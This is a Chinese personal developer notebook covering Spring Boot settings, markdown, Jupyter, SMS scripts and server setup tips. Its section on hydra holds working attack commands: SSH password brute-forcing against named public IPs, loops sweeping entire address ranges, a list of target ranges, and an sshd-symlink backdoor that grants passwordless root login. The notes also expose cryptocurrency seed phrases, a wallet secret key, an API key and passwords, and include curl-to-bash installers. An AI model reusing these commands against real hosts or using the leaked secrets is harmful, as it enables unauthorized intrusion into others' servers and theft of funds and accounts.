class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端口</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">8004</span></span><br><span class="line"><span class="comment"># 服务名</span></span><br><span class="line"><span class="meta">spring.application.name</span>=<span class="string">service-cms</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#环境设置：dev、test、prod</span></span><br><span class="line"><span class="meta">spring.profiles.active</span>=<span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysql数据库连接  spring boot&gt;2.1(com.mysql.cj.jdbc.Driver) &lt;2.1(com.mysql.jdbc.Driver)</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment"># mysql8+ (jdbc:mysql://localhost:3306/guli?serverTimezone=GMT%2B8 / UTC) mysql5 (jdbc:mysql://localhost:3306/guli?)</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/guli_edu?serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回json的全局时间格式</span></span><br><span class="line"><span class="meta">spring.jackson.date-format</span>=<span class="string">yyyy-MM-dd HH:mm:ss</span></span><br><span class="line"><span class="meta">spring.jackson.time-zone</span>=<span class="string">GMT+8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mapper xml文件的路径</span></span><br><span class="line"><span class="meta">mybatis-plus.mapper-locations</span>=<span class="string">classpath:com/aliyun/eduservice/mapper/xml/*.xml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line"><span class="comment">#logging.level.root=INFO</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mybatis日志(切换logback日志)</span></span><br><span class="line"><span class="comment">#mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加标志位 1代表删除  0代表不删除 (不写有默认值 0不删除 1删除)</span></span><br><span class="line"><span class="meta">mybatis-plus.global-config.db-config.logic-delete-value</span>=<span class="string">1</span></span><br><span class="line"><span class="meta">mybatis-plus.global-config.db-config.logic-not-delete-value</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure><h1 id="八-markdown的使用"><a href="#八-markdown的使用" class="headerlink" title="八. markdown的使用"></a>八. markdown的使用</h1><p><font color="#0099ff" size="6" face="STCAIYUN">Spring Boot</font></p><p>颜色码表：</p><p><img src="https://images.cnblogs.com/cnblogs_com/yuyibigdata/2104475/o_220209091031_view.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- [x] 洗碗</span><br><span class="line">- [ ] 清洗油烟机</span><br><span class="line">- [ ] 拖地</span><br><span class="line">- [ ]</span><br></pre></td></tr></table></figure><ul><li><input checked disabled type="checkbox"> 洗碗</li><li><input disabled type="checkbox"> 清洗油烟机</li><li><input disabled type="checkbox"> 拖地</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 回车</span><br></pre></td></tr></table></figure><blockquote><p>123</p></blockquote><p>==123==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">折叠：</span><br><span class="line">&lt;details&gt;  &#x2F;&#x2F; 表明这是html 语法</span><br><span class="line">&lt;summary&gt;&lt;mark&gt;&lt;font color&#x3D;darkred&gt;点击查看详细内容&lt;&#x2F;font&gt;&lt;&#x2F;mark&gt;&lt;&#x2F;summary&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure><details><summary><mark><font color="darkred"># 1. 点击查看详细内容</font></mark></summary><pre><code>Hello world!def open_url(url):    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5'                          '37.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}    # req = ur.Request("https://www.coincola.info/buy-bitcoin", headers=head)    # print(response.getcode())    req = ur.Request(url, headers=head)    response = ur.urlopen(req)    html = response.read().decode('utf-8')</code></pre></details><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">插入目录： 输入</span><br><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h1 id="九-git-的使用"><a href="#九-git-的使用" class="headerlink" title="九. git 的使用"></a>九. git 的使用</h1><table><thead><tr><th>命令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>git rm -r –cached ./firstHTML/（要删除的文件）</td><td>将已经add到git 中的文件删除</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h1 id="十-idea"><a href="#十-idea" class="headerlink" title="十. idea"></a>十. idea</h1><h3 id="10-1-idea-快捷键"><a href="#10-1-idea-快捷键" class="headerlink" title="10.1 idea 快捷键"></a>10.1 idea 快捷键</h3><h3 id="10-2-idea-插件"><a href="#10-2-idea-插件" class="headerlink" title="10.2 idea 插件"></a>10.2 idea 插件</h3><blockquote><p>free mybatis plugin<br>lombok</p></blockquote><h1 id="十一-VScode-快捷键"><a href="#十一-VScode-快捷键" class="headerlink" title="十一. VScode 快捷键"></a>十一. VScode 快捷键</h1><h2 id="11-1-VScode-快捷键"><a href="#11-1-VScode-快捷键" class="headerlink" title="11.1 VScode 快捷键"></a>11.1 VScode 快捷键</h2><h2 id="11-2-抽取代码片段"><a href="#11-2-抽取代码片段" class="headerlink" title="11.2 抽取代码片段"></a>11.2 抽取代码片段</h2><p>首选项 –&gt;  用户代码片段 –&gt; 新建全局代码片段 –&gt; 文件名：xxx.code-snippets</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">"Vue模板": &#123;</span><br><span class="line">"scope": "html",</span><br><span class="line">"prefix": "htm",</span><br><span class="line">"body": [</span><br><span class="line">"<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span>" +</span><br><span class="line">"<span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">\</span>"<span class="attr">en</span>\"&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"<span class="tag">&lt;<span class="name">head</span>&gt;</span>" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">\</span>"<span class="attr">UTF-8</span>\"&gt;</span>" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">\</span>"<span class="attr">viewport</span>\" <span class="attr">content</span>=<span class="string">\</span>"<span class="attr">width</span>=<span class="string">device-width,</span> <span class="attr">initial-scale</span>=<span class="string">1.0\</span>"&gt;</span>" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span>" +</span><br><span class="line">"<span class="tag">&lt;/<span class="name">head</span>&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"<span class="tag">&lt;<span class="name">body</span>&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">\</span>"<span class="attr">https:</span>//<span class="attr">cdnjs.cloudflare.com</span>/<span class="attr">ajax</span>/<span class="attr">libs</span>/<span class="attr">vue</span>/<span class="attr">2.1.8</span>/<span class="attr">vue.min.js</span>\"&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">\</span>"<span class="attr">app</span>\"&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>" +</span><br><span class="line">"" +</span><br><span class="line">"" +</span><br><span class="line">"    <span class="tag">&lt;<span class="name">script</span>&gt;</span>" +</span><br><span class="line"><span class="actionscript"><span class="string">"        new Vue(&#123;"</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">"            el:'#app', // 绑定vue作用的范围"</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">"            data:&#123; // 定义页面中显示的模型数据"</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">"                $0"</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">"            &#125;"</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">""</span> +</span></span><br><span class="line"><span class="actionscript"><span class="string">"        &#125;)"</span> +</span></span><br><span class="line">"    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>" +</span><br><span class="line">"<span class="tag">&lt;/<span class="name">body</span>&gt;</span>" +</span><br><span class="line">"<span class="tag">&lt;/<span class="name">html</span>&gt;</span>"</span><br><span class="line">],</span><br><span class="line">"description": "Vue模板"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="十二-jupyter的使用"><a href="#十二-jupyter的使用" class="headerlink" title="十二.  jupyter的使用"></a>十二.  jupyter的使用</h1><h3 id="12-1-配置目录："><a href="#12-1-配置目录：" class="headerlink" title="12.1 配置目录："></a>12.1 配置目录：</h3><blockquote><p>/root/.jupyter/jupyter_notebook_config.py</p></blockquote><h2 id="12-2-jupyter实用插件"><a href="#12-2-jupyter实用插件" class="headerlink" title="==12.2 jupyter实用插件=="></a>==12.2 jupyter实用插件==</h2><table><thead><tr><th>插件</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td><a href="https://github.com/jupyterlab/jupyterlab-toc" target="_blank" rel="noopener">@jupyterlab/toc</a></td><td>对笔记进行折叠</td><td></td></tr><tr><td><a href="https://github.com/lckr/jupyterlab-variableInspector" target="_blank" rel="noopener">@lckr/jupyterlab_variableinspector</a></td><td>查看定义的变量</td><td></td></tr><tr><td><a href="https://github.com/krassowski/jupyterlab-go-to-definition" target="_blank" rel="noopener">@krassowski/jupyterlab_go_to_definition</a></td><td>快速跳转到定义的变量</td><td></td></tr><tr><td><a href="https://github.com/jupyter-widgets/ipywidgets" target="_blank" rel="noopener">@jupyter-widgets/jupyterlab-manager</a></td><td>对函数调整输入的参数</td><td>可视化显示（功能很强大）</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="12-2-常用命令"><a href="#12-2-常用命令" class="headerlink" title="12.2 常用命令"></a>12.2 常用命令</h2><table><thead><tr><th>命令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>jupyter notebook –generate-config</td><td>配置jupyter</td><td></td></tr><tr><td>%time</td><td><strong>获取代码运行时间</strong></td><td></td></tr><tr><td>%timeit</td><td><strong>获取代码平均运行时间</strong></td><td></td></tr><tr><td>%who</td><td>查看当前会话的所有变量与函数名称</td><td></td></tr><tr><td>%whos</td><td>查看当前会话的所有变量与函数名称的详细信息：</td><td></td></tr><tr><td>%who_ls</td><td>返回一个字符串列表，里面元素是当前会话的所有变量与函数名称：</td><td></td></tr><tr><td>lsmagic</td><td>列出所有命令</td><td></td></tr><tr><td>!ls</td><td>执行linu上的命令</td><td></td></tr><tr><td>!jupyter nbconvert –to python faissDemo2.ipynb</td><td>将.ipynb转换成自己想要的文件</td><td></td></tr><tr><td>mstsc</td><td>win10连接远程</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h1 id="十三-实用小技巧"><a href="#十三-实用小技巧" class="headerlink" title="十三. 实用小技巧"></a>十三. 实用小技巧</h1><h3 id="13-1-用you-get下载各种视频"><a href="#13-1-用you-get下载各种视频" class="headerlink" title="13.1 用you-get下载各种视频"></a>13.1 用you-get下载各种视频</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you-get https://www.bilibili.com/video/BV1SA411J7zM?spm_id_from=333.851.b_7265706f7274466972737431.10</span><br></pre></td></tr></table></figure><p>![image-20200824220240041](X:\Users\xu\Application Data\XMind\workspace-cathy.temp-attachments\attachments\常用配置.assets\image-20200824220240041.png)</p><p><a href="https://www.zhihu.com/question/23805794" target="_blank" rel="noopener">如何下载网页上的视频</a></p><h3 id="13-2-生成二维码"><a href="#13-2-生成二维码" class="headerlink" title="13.2 生成二维码"></a>13.2 生成二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr <span class="keyword">as</span> mq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#1、生成普通二维码,生成的二维码路径与源代码路径一致</span></span><br><span class="line">f_dir = <span class="string">"hz"</span></span><br><span class="line">os.mkdir(f_dir)</span><br><span class="line"><span class="comment"># colorized = True 彩色二维码 false:黑白</span></span><br><span class="line">mq.run(<span class="string">'https://xuwei_big_datax.gitee.io/'</span>,picture= <span class="string">'header.jpg'</span>, save_name=<span class="string">f'<span class="subst">&#123;f_dir&#125;</span>/121.png'</span>,colorized = <span class="literal">True</span>)</span><br><span class="line">print(<span class="string">"生成的二维码路径与源代码路径一致!"</span>)</span><br></pre></td></tr></table></figure><h3 id="13-3-给手机发送短信"><a href="#13-3-给手机发送短信" class="headerlink" title="13.3  给手机发送短信"></a>13.3  给手机发送短信</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#用户名 查看用户名请登录用户中心-&gt;验证码、通知短信-&gt;帐户及签名设置-&gt;APIID</span></span><br><span class="line">account  = <span class="string">"C78762782"</span>        <span class="comment">#这是我的用户名，请更换成自己的</span></span><br><span class="line"><span class="comment">#密码 查看密码请登录用户中心-&gt;验证码、通知短信-&gt;帐户及签名设置-&gt;APIKEY</span></span><br><span class="line">password = <span class="string">"18e7e8ade292066f0bf10db7997ed321"</span>     <span class="comment">#这是我的密码，已重置，请更换成自己的</span></span><br><span class="line"><span class="comment">#互亿无线请求发送短信验证码的网址，直接复制使用</span></span><br><span class="line">url= <span class="string">r'http://106.ihuyi.com/webservice/sms.php?method=Submit'</span></span><br><span class="line"><span class="comment">#这里是要发送给用户的手机号码</span></span><br><span class="line">mobile = <span class="string">"13545299700"</span></span><br><span class="line"><span class="comment">#随机生成6个数字</span></span><br><span class="line"><span class="comment">#现定义一个空字符串用于接收生成的6个数字</span></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line"><span class="comment">#for循环生成数字</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="comment">#使用random随机生成一个数字</span></span><br><span class="line">    num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">    <span class="comment">#对数字转换成字符串后进行拼接</span></span><br><span class="line">    code += str(num)</span><br><span class="line"><span class="comment">#这里是要发送的内容, %s 是要发送的验证码，用于占位，</span></span><br><span class="line"><span class="comment"># text = "您的验证码是：%s。请不要把验证码泄露给其他人。"%code</span></span><br><span class="line">text = <span class="string">f"您的验证码是：<span class="subst">&#123;code&#125;</span>。请不要把验证码泄露给其他人。"</span></span><br><span class="line"><span class="comment">#通过查看互亿无线提供的技术文档，发送短信验证码需要提供的数据及格式，并用字典存在data中</span></span><br><span class="line">data = &#123;<span class="string">'account'</span>: account, <span class="string">'password'</span> : password, <span class="string">'content'</span>: text, <span class="string">'mobile'</span>:mobile,<span class="string">'format'</span>:<span class="string">'json'</span> &#125;</span><br><span class="line">print(data)</span><br><span class="line"><span class="comment">#使用requests 发送POST请求给互亿无线，并接收返回的response内容</span></span><br><span class="line">req = requests.post(url=url, data=data)</span><br><span class="line"><span class="comment">#使用.text读取返回的内容</span></span><br><span class="line">content =req.text</span><br><span class="line"><span class="comment">#打印出返回的内容</span></span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure><h3 id="13-4-在centos7上搭建v2ray"><a href="#13-4-在centos7上搭建v2ray" class="headerlink" title="13.4 在centos7上搭建v2ray"></a>13.4 在centos7上搭建v2ray</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_v2ray.sh)</span><br><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br><span class="line">bash &lt;(curl -sL https://storage.googleapis.com/tiziblog/setup.sh)——&gt; https://tizi.blog/27.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前是否启用了bbr</span></span><br><span class="line">sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure><ul><li>保存vmess链接</li></ul><h3 id="13-5-宝塔命令"><a href="#13-5-宝塔命令" class="headerlink" title="13.5 宝塔命令"></a>13.5 宝塔命令</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装：</span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br><span class="line"></span><br><span class="line">重启：</span><br><span class="line">/etc/init.d/bt start</span><br></pre></td></tr></table></figure><h3 id="13-6-区块链——挖矿"><a href="#13-6-区块链——挖矿" class="headerlink" title="13.6 区块链——挖矿"></a>13.6 区块链——挖矿</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">以太币 ETH</span><br><span class="line">密语</span><br><span class="line">suggest junk antenna pony wild tower proof fever ritual shift coin hole </span><br><span class="line"></span><br><span class="line">钱包地址</span><br><span class="line">0xEf58529Ce0B1bC38861E139fA41Bb6b4Ff2C7f95</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">门罗币 XMR</span><br><span class="line">密语</span><br><span class="line">昌 妻 巴 兵 士 壤 氮 敏 拖 水 碍 脂 神 像 珍 马 仍 他 球 低 苯 扰 私 退 妻</span><br><span class="line"></span><br><span class="line">address</span><br><span class="line">43KKtDbFX2xhEGRcj1QmFDGxCjXQEsPSsCFwuf6TDwQJF4i7bzR3B6kBCohb46wcoMHMX8QgoengkZYYG1GMFTxi8ZjEpok</span><br><span class="line"></span><br><span class="line">secret</span><br><span class="line">bc2703c5e7f841cb31062e55f6d4912926efe665776fab875bd27fb435d40d0e</span><br><span class="line"></span><br><span class="line">xdag币：</span><br><span class="line">CjpNIivrUweEvfDMGyBdiCYkISk3LCf5 钱包地址：https:&#x2F;&#x2F;explorer.xdag.io&#x2F;</span><br></pre></td></tr></table></figure><h3 id="13-7-hydra-暴力破解"><a href="#13-7-hydra-暴力破解" class="headerlink" title="13.7 hydra 暴力破解"></a>13.7 hydra 暴力破解</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">安装：yum -y install gcc libssh-devel openssl-devel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">破解SSH命令</span><br><span class="line">hydra -s 22 -l root -P ./passwd/keyboard_all.txt -t 4 -o save.log -vV 192.168.18.12 ssh</span><br><span class="line"></span><br><span class="line">hydra -s 22 -l root -P ./passwd/keyboard_all.txt -t 4 -o save.log -vV 185.186.65.34 ssh</span><br><span class="line"></span><br><span class="line">hydra -s 22 -l root -P ./passwd/digit_and_letter_top1000.txt -t 4 -o save.log -vV 154.91.144.46 ssh</span><br><span class="line"></span><br><span class="line">关闭所有的hydra 程序</span><br><span class="line">ps -ef | grep hydra | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line"></span><br><span class="line">linux脚本：</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span>((j=1;j&lt;=255;j++));</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=255;i++));</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">hydra -s 22 -l root -P /home/thc-hydra-master/passwd/digit_and_letter_top1000.txt -t 4 -o /home/thc-hydra-master/save.log -vV 154.91.<span class="variable">$j</span>.<span class="variable">$i</span> ssh &amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-----------------------------------------------------------------"</span></span><br><span class="line">cat /home/thc-hydra-master/save.log | grep password</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win脚本：</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title jupyter start</span><br><span class="line">color 0A</span><br><span class="line">mode con cols=90 lines=30</span><br><span class="line">:: todo</span><br><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (106,1,255) <span class="keyword">do</span> hydra -l root -P ./passwd/top1000 -t 16 -o ./save.log -s 22 -vV 103.251.236.%%i ssh</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看结果：</span><br><span class="line">cat /home/thc-hydra-master/save.log | grep password</span><br><span class="line"></span><br><span class="line">服务器后门</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=35779</span><br><span class="line">执行完之后，任何一台机器ssh root@IP -p 35779不需要密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">尝试列表：</span><br><span class="line">185.10.104.0185.10.107.255</span><br><span class="line">185.23.180.0185.23.183.255</span><br><span class="line">202.0.128.0202.0.143.255</span><br><span class="line">202.4.192.0202.4.223.255</span><br><span class="line">120.14.99.165</span><br></pre></td></tr></table></figure><h3 id="13-8-win10设置开机自启动"><a href="#13-8-win10设置开机自启动" class="headerlink" title="13.8 win10设置开机自启动"></a>13.8 win10设置开机自启动</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 运行命令</span><br><span class="line"><span class="function">shell:<span class="title">startup</span></span></span><br><span class="line"><span class="function">2. 将要启动的文件快捷键放入</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">或者输入：</span></span><br><span class="line"><span class="function">%<span class="title">programdata</span>%\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Start</span> <span class="title">Menu</span>\<span class="title">Programs</span>\<span class="title">Startup</span></span></span><br></pre></td></tr></table></figure><h3 id="13-9-苹果CMS"><a href="#13-9-苹果CMS" class="headerlink" title="13.9 苹果CMS"></a>13.9 苹果CMS</h3><h5 id="13-9-1-搭建环境"><a href="#13-9-1-搭建环境" class="headerlink" title="13.9.1 搭建环境"></a>13.9.1 搭建环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 购买服务器 搭建LNMP(Linux下Apache、MySQL、PHP) 环境 PHP要选择7.2版本的</span><br><span class="line">2. 导入源码包 添加站点 添加数据库 ibiubiu_xyz&#x2F;bjgafjkjk@123 管理员：bigdata001&#x2F;bjgafjkjk@123 root&#x2F;Hik12345+</span><br><span class="line">3. 进入PHP7.2 安装sg11</span><br><span class="line">4. 将admin.php文件改名为 ibiubiu.php</span><br></pre></td></tr></table></figure><h5 id="13-9-2-重要文件及配置"><a href="#13-9-2-重要文件及配置" class="headerlink" title="13.9.2 重要文件及配置"></a>13.9.2 重要文件及配置</h5><ul><li>application–lang–database.php        登录平台初始化时账号和密码</li></ul><h5 id="13-9-3-自定菜单"><a href="#13-9-3-自定菜单" class="headerlink" title="13.9.3 自定菜单"></a>13.9.3 自定菜单</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">后台页面--首页--自定义菜单配置：</span><br><span class="line">海螺主题设置,&#x2F;ibiubiu.php&#x2F;admin&#x2F;conch&#x2F;theme</span><br></pre></td></tr></table></figure><h5 id="13-9-4-安装Far采集插件"><a href="#13-9-4-安装Far采集插件" class="headerlink" title="13.9.4 安装Far采集插件"></a>13.9.4 安装Far采集插件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. far官网：https:&#x2F;&#x2F;www.ayuancms.com&#x2F;</span><br><span class="line">2. 解压，将caiji文件夹上传至addons文件夹内（版本V5.6）</span><br><span class="line">3. 登陆网站后台，找到“应用”&gt;&gt;&quot;应用市场&quot;，会看到 